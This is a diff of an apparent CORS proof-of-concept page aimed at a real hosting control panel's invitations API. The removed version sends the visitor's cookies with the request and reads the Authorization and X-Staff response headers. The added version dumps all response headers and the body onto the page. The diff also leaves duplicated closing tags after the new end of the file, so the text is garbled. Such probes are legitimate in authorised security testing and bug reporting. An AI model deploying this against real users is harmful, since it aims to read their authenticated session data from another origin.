@@ -1,40 +1,34 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Fetch API Response</title>
+  <title>CORS PoC</title>
 </head>
 <body>
-<h1>API Response</h1>
-<pre id="output"></pre>
+  <h2>CORS Test PoC</h2>
+  <pre id="output">Loading...</pre>
 
-<script>
-const targetUrl = 'https://hpanel.hostinger.com/api/auth/api/external/v1/invitations?gaid=GA1.1.1770165202.1756321190';
-const output = document.getElementById('output');
+  <script>
+    async function test() {
+      try {
+        let res = await fetch("https://hpanel.hostinger.com/api/auth/api/external/v1/invitations");
+        
+        let headers = "";
+        for (let [k, v] of res.headers.entries()) {
+          headers += k + ": " + v + "\n";
+        }
 
-fetch(targetUrl, {
-    method: 'GET',
-    credentials: 'include'  // send cookies
-})
-.then(async response => {
-    const headers = {
-        authorization: response.headers.get('Authorization'),
-        xStaff: response.headers.get('X-Staff')
-    };
-    
-    let body;
-    try { 
-        body = await response.json(); 
-    } catch(e) { 
-        body = await response.text(); 
+        let body = await res.text();
+        document.getElementById("output").textContent = 
+          "=== HEADERS ===\n" + headers + "\n\n=== BODY ===\n" + body;
+      } catch (e) {
+        document.getElementById("output").textContent = "Error: " + e;
+      }
     }
 
-    // Show everything on the page
-    output.textContent = `Status: ${response.status}\n\nHeaders: ${JSON.stringify(headers, null, 2)}\n\nBody: ${JSON.stringify(body, null, 2)}`;
-})
-.catch(err => {
-    output.textContent = 'Error: ' + err;
-});
+    test();
+  </script>
+</body>
+</html>});
 </script>
 </body>
 </html>
